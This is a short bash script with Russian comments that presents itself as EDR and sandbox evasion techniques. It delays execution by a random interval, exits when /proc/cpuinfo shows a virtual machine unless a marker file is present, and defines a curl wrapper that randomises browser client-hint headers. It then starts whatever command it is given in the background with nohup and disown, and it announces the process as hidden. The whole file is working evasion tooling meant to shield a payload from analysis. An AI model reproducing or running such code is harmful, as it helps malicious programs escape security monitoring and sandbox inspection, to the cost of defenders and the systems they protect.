#!/bin/bash
# Evasion Techniques — обход EDR и песочниц

echo "[EVASION] Загрузка техник обхода..."

# 1. Sandbox Evasion: задержка перед выполнением
SANDBOX_SLEEP=$((RANDOM % 30 + 10))
echo "[EVASION] Sandbox sleep: ${SANDBOX_SLEEP}s"
sleep $SANDBOX_SLEEP

# 2. Проверка на виртуализацию (выход если песочница)
if grep -q "hypervisor\|VMware\|VirtualBox\|QEMU" /proc/cpuinfo 2>/dev/null; then
    if [ ! -f "/tmp/.argus_ok" ]; then
        echo "[EVASION] VM detected — exiting (sandbox)"
        exit 0
    fi
fi

# 3. Рандомизация TLS fingerprint
RANDOM_TLS() {
    curl -H "Sec-Ch-Ua: \"Chromium\";v=\"$(shuf -i 120-131 -n 1)\"" \
         -H "Sec-Ch-Ua-Platform: \"$(shuf -e Windows macOS Linux -n 1)\"" \
         "$@"
}

echo "[EVASION] Техники обхода загружены"
echo "[EVASION] Запуск с задержкой $((RANDOM % 60 + 30)) секунд..."
nohup "$@" >/dev/null 2>&1 &
disown
echo "[EVASION] Процесс скрыт"
